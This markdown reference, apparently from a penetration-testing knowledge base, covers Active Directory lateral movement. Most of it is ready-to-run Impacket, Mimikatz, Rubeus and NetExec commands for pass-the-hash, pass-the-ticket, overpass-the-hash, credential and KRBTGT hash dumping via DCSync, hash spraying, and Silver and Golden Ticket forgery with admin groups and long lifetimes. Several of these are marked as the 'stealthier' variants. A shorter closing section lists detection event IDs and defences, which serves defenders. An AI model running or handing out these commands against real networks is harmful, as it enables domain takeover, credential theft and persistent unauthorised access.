---
title: Active Directory Lateral Movement Techniques
category: techniques
subcategory: active-directory
tags: [lateral-movement, pass-the-hash, pass-the-ticket, overpass-the-hash, golden-ticket, silver-ticket]
last_updated: 2025-12-27
---

# Active Directory Lateral Movement Techniques

## Table of Contents

- [Overview](#overview)
- [Pass-the-Hash (PtH)](#pass-the-hash-pth)
- [Pass-the-Ticket (PtT)](#pass-the-ticket-ptt)
- [Overpass-the-Hash / Pass-the-Key](#overpass-the-hash--pass-the-key)
- [Silver Ticket](#silver-ticket)
- [Golden Ticket](#golden-ticket)
- [Detection and Defense](#detection-and-defense)
- [References](#references)

## Overview

Lateral movement in Active Directory involves using stolen credentials or forged tickets to access additional systems. These techniques allow attackers to move through the network without knowing plaintext passwords.

**Key Concepts:**
- **NTLM Hash**: Can authenticate to services accepting NTLM
- **Kerberos Tickets**: TGT allows requesting service tickets; TGS allows service access
- **Forged Tickets**: Created with stolen encryption keys

---

## Pass-the-Hash (PtH)

### Description

Pass-the-Hash uses NTLM hashes to authenticate to services without knowing the plaintext password. NTLM hashes remain static until the password changes, making them valuable for persistence.

**Requirements:**
- NTLM hash of a user account
- Target services accepting NTLM authentication

### Tools and Commands

**Impacket:**
```bash
# psexec.py - Get SYSTEM shell via SMB
psexec.py -hashes :NTLM_HASH domain.local/admin@TARGET

# wmiexec.py - Semi-interactive shell via WMI (no disk writes)
wmiexec.py -hashes :NTLM_HASH domain.local/admin@TARGET

# smbexec.py - Shell via SMB
smbexec.py -hashes :NTLM_HASH domain.local/admin@TARGET

# atexec.py - Execute commands via Task Scheduler
atexec.py -hashes :NTLM_HASH domain.local/admin@TARGET "whoami"

# dcomexec.py - Shell via DCOM
dcomexec.py -hashes :NTLM_HASH domain.local/admin@TARGET
```

**Mimikatz:**
```
# Pass-the-hash with Mimikatz
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd.exe

# With AES keys (if available)
sekurlsa::pth /user:administrator /domain:domain.local /aes256:KEY /run:cmd.exe
```

**CrackMapExec/NetExec:**
```bash
# Execute command
netexec smb TARGET -u admin -H NTLM_HASH -x "whoami"

# Get SAM hashes
netexec smb TARGET -u admin -H NTLM_HASH --sam

# Spray hash across network
netexec smb TARGETS -u admin -H NTLM_HASH

# Check local admin access
netexec smb TARGETS -u admin -H NTLM_HASH --local-auth
```

**Evil-WinRM:**
```bash
evil-winrm -i TARGET -u admin -H NTLM_HASH
```

**xfreerdp (RDP with hash - requires Restricted Admin mode):**
```bash
xfreerdp /v:TARGET /u:admin /pth:NTLM_HASH
```

---

## Pass-the-Ticket (PtT)

### Description

Pass-the-Ticket uses stolen Kerberos tickets (TGT or TGS) to authenticate. Unlike PtH, PtT works with Kerberos and doesn't require NTLM.

**Ticket Types:**
- **TGT (Ticket Granting Ticket)**: Can request TGS for any service
- **TGS (Ticket Granting Service)**: Access to specific service only

### Exporting Tickets

**Mimikatz:**
```
privilege::debug

# Export all tickets
sekurlsa::tickets /export

# List Kerberos tickets
kerberos::list

# Export current session tickets
kerberos::list /export
```

**Rubeus:**
```powershell
# Dump all tickets
.\Rubeus.exe dump

# Dump tickets for specific LUID
.\Rubeus.exe dump /luid:0x3e7

# Triage tickets
.\Rubeus.exe triage
```

### Injecting Tickets

**Mimikatz:**
```
# Import ticket
kerberos::ptt ticket.kirbi

# Verify
kerberos::list

# Purge tickets
kerberos::purge
```

**Rubeus:**
```powershell
# Pass-the-ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi

# From Base64
.\Rubeus.exe ptt /ticket:base64_blob
```

**Linux (ccache):**
```bash
# Set ticket cache
export KRB5CCNAME=/path/to/ticket.ccache

# Use with Impacket
psexec.py -k -no-pass domain.local/user@TARGET
wmiexec.py -k -no-pass domain.local/user@TARGET
```

### Converting Ticket Formats

```bash
# Kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Ccache to kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

---

## Overpass-the-Hash / Pass-the-Key

### Description

Overpass-the-Hash (also called Pass-the-Key) uses an NTLM hash or AES key to request a Kerberos TGT. This converts an NTLM hash into Kerberos authentication, useful when NTLM is restricted.

**Advantages over PtH:**
- Works in environments where NTLM is disabled
- Generates valid Kerberos tickets
- Access to Kerberos-only services

### Commands

**Mimikatz:**
```
# Overpass-the-hash with NTLM
sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:cmd.exe

# With AES256 key (stealthier)
sekurlsa::pth /user:admin /domain:domain.local /aes256:KEY /run:cmd.exe

# With AES128 key
sekurlsa::pth /user:admin /domain:domain.local /aes128:KEY /run:cmd.exe
```

**Rubeus:**
```powershell
# Request TGT with hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt

# With AES256 (preferred)
.\Rubeus.exe asktgt /user:admin /aes256:KEY /ptt

# Request TGT and save to file
.\Rubeus.exe asktgt /user:admin /rc4:HASH /outfile:ticket.kirbi
```

**Impacket:**
```bash
# Get TGT with hash
getTGT.py domain.local/admin -hashes :NTLM_HASH

# With AES key
getTGT.py domain.local/admin -aesKey AES256_KEY

# Use the ticket
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass domain.local/admin@TARGET
```

---

## Silver Ticket

### Description

Silver Tickets are forged Kerberos TGS tickets for specific services. They're encrypted with the service account's password hash, bypassing the KDC entirely.

**Requirements:**
- NTLM hash or AES key of service account
- Domain SID
- Service Principal Name (SPN)

**Advantages:**
- No communication with DC (stealthier)
- Targets specific service
- Harder to detect than Golden Tickets

### Common Service SPNs

| Service | SPN Format | Example |
|---------|-----------|---------|
| CIFS/SMB | cifs/hostname | cifs/dc01.domain.local |
| HTTP | http/hostname | http/web01.domain.local |
| HOST | host/hostname | host/dc01.domain.local |
| LDAP | ldap/hostname | ldap/dc01.domain.local |
| MSSQL | MSSQLSvc/hostname:port | MSSQLSvc/sql01:1433 |
| WinRM | http/hostname + wsman/hostname | http/srv01 |

### Commands

**Mimikatz:**
```
# Create Silver Ticket for CIFS (file share access)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:dc01.domain.local /service:cifs /rc4:SERVICE_HASH /ptt

# Silver Ticket for HOST (PsExec)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:dc01.domain.local /service:host /rc4:HASH /ptt

# Silver Ticket for HTTP (WinRM)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:srv01.domain.local /service:http /rc4:HASH /ptt

# With AES key (stealthier)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:dc01.domain.local /service:cifs /aes256:KEY /ptt
```

**Rubeus:**
```powershell
# Create Silver Ticket
.\Rubeus.exe silver /user:Administrator /service:cifs/dc01.domain.local /rc4:HASH /sid:S-1-5-21-xxx /ptt

# With domain info
.\Rubeus.exe silver /user:Administrator /service:cifs/dc01.domain.local /rc4:HASH /sid:S-1-5-21-xxx /domain:domain.local /ptt
```

**Impacket:**
```bash
# Create Silver Ticket
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/dc01.domain.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass domain.local/Administrator@dc01.domain.local
```

---

## Golden Ticket

### Description

Golden Tickets are forged TGTs encrypted with the KRBTGT account's password hash. They provide unrestricted access to the entire domain and can be created with arbitrary attributes.

**Requirements:**
- KRBTGT NTLM hash (from DCSync or NTDS.dit)
- Domain SID
- Domain name

**Capabilities:**
- Impersonate any user in the domain
- Access any service in the domain
- Persist for the ticket lifetime (default 10 years)
- Survives password changes (except KRBTGT reset)

### Getting KRBTGT Hash

```bash
# DCSync with Impacket
secretsdump.py domain.local/admin:password@DC_IP -just-dc-user krbtgt

# Mimikatz DCSync
lsadump::dcsync /user:domain\krbtgt
```

### Creating Golden Tickets

**Mimikatz:**
```
# Create Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /ptt

# With groups (add to Domain Admins, Enterprise Admins)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /groups:512,513,518,519,520 /ptt

# Long lifetime (10 years default, but can specify)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /endin:600 /renewmax:10080 /ptt

# Save to file
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ticket:golden.kirbi

# With AES keys (stealthier)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /aes256:KRBTGT_AES256 /ptt
```

**Rubeus:**
```powershell
# Create Golden Ticket
.\Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# With specific groups
.\Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /groups:512,519 /ptt
```

**Impacket:**
```bash
# Create Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator

# With AES key
ticketer.py -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-xxx -domain domain.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
```

### Inter-Realm Golden Tickets

For forest-wide access across trusts:

```
# Get Enterprise Admin SID from parent domain
# Add /sids: parameter for SID history injection

kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-child /krbtgt:CHILD_KRBTGT /sids:S-1-5-21-parent-519 /ptt
```

---

## Detection and Defense

### Detection

| Technique | Detection Indicators |
|-----------|---------------------|
| Pass-the-Hash | Event ID 4624 Type 9, NTLM auth from unusual sources |
| Pass-the-Ticket | Event ID 4768/4769 from unusual sources |
| Overpass-the-Hash | Event ID 4768 with RC4 from non-DC sources |
| Silver Ticket | Service access without prior TGS request to DC |
| Golden Ticket | TGT with unusual lifetime, no matching 4768 event |

### Key Event IDs

| Event ID | Description |
|----------|-------------|
| 4624 | Account logon (check Type 3, 9, 10) |
| 4648 | Explicit credential logon |
| 4768 | TGT requested |
| 4769 | TGS requested |
| 4771 | Kerberos pre-auth failed |

### Golden Ticket Detection

- TGT lifetime exceeds policy
- User in TGT doesn't exist or has different RID
- No corresponding 4768 on DC
- Encryption type anomalies

### Defensive Measures

**General:**
- Enable Credential Guard
- Use Protected Users group for privileged accounts
- Implement tiered administration
- Monitor authentication anomalies

**KRBTGT Protection:**
- Reset KRBTGT password twice regularly (with 12-24 hour gap)
- Monitor for DCSync attempts
- Alert on KRBTGT hash extraction attempts

**Service Accounts:**
- Use long, random passwords for service accounts
- Use Group Managed Service Accounts (gMSA)
- Rotate service account passwords regularly

**Network Segmentation:**
- Limit lateral movement paths
- Use host-based firewalls
- Implement jump servers for administration

```powershell
# Reset KRBTGT password (do twice, 12-24 hours apart)
# Run on DC with Domain Admin rights
Reset-ADServiceAccountPassword -Identity krbtgt
```

---

## References

- [MITRE ATT&CK - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [MITRE ATT&CK - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [MITRE ATT&CK - Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- [HackTricks - Overpass-the-Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key)
- [CrowdStrike - Golden Ticket](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/golden-ticket-attack/)
- [CrowdStrike - Silver Ticket](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/silver-ticket-attack/)
- [ired.team - Kerberos Abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
